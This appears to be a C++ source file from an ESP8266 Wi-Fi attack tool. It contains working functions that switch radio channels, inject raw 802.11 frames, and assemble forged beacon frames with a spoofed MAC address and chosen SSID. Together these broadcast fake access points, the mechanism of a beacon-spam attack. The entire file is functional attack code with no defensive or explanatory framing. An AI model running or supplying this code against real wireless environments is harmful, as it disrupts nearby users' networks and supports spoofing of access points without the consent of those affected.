#include "attack.hpp"

void setWifiChannel(uint8_t ch, bool force) {
    if (((ch != wifi_channel) || force) && (ch < 15)) {
        wifi_channel = ch;
        wifi_set_channel(wifi_channel);
    }
}

bool sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, bool force_ch) {
    // Serial.println(bytesToStr(packet, packetSize));

    // set channel
    setWifiChannel(ch, force_ch);

    // sent out packet
    bool sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;



    return sent;
}


bool sendBeacon(uint8_t* mac, const char* ssid, uint8_t ch, bool wpa2) {
    
    uint16_t packetSize = sizeof(beaconPacket);

    if (wpa2) {
        beaconPacket[34] = 0x31;
    } else {
        beaconPacket[34] = 0x21;
        packetSize      -= 26;
    }

    int ssidLen = strlen(ssid);

    if (ssidLen > 32) ssidLen = 32;

    memcpy(&beaconPacket[10], mac, 6);
    memcpy(&beaconPacket[16], mac, 6);
    memcpy(&beaconPacket[38], ssid, ssidLen);

    beaconPacket[82] = ch;

    // =====
    uint16_t tmpPacketSize = (packetSize - 32) + ssidLen;                // calc size
    uint8_t* tmpPacket     = new uint8_t[tmpPacketSize];                 // create packet buffer

    memcpy(&tmpPacket[0], &beaconPacket[0], 38 + ssidLen);               // copy first half of packet into buffer
    tmpPacket[37] = ssidLen;                                             // update SSID length byte
    memcpy(&tmpPacket[38 + ssidLen], &beaconPacket[70], wpa2 ? 39 : 13); // copy second half of packet into buffer

    bool success = sendPacket(tmpPacket, tmpPacketSize, ch, false);

    if (success) {
        beacon.time = currentTime;
        beacon.packetCounter++;
    }

    delete[] tmpPacket; // free memory of allocated buffer

    return success;
    // =====
}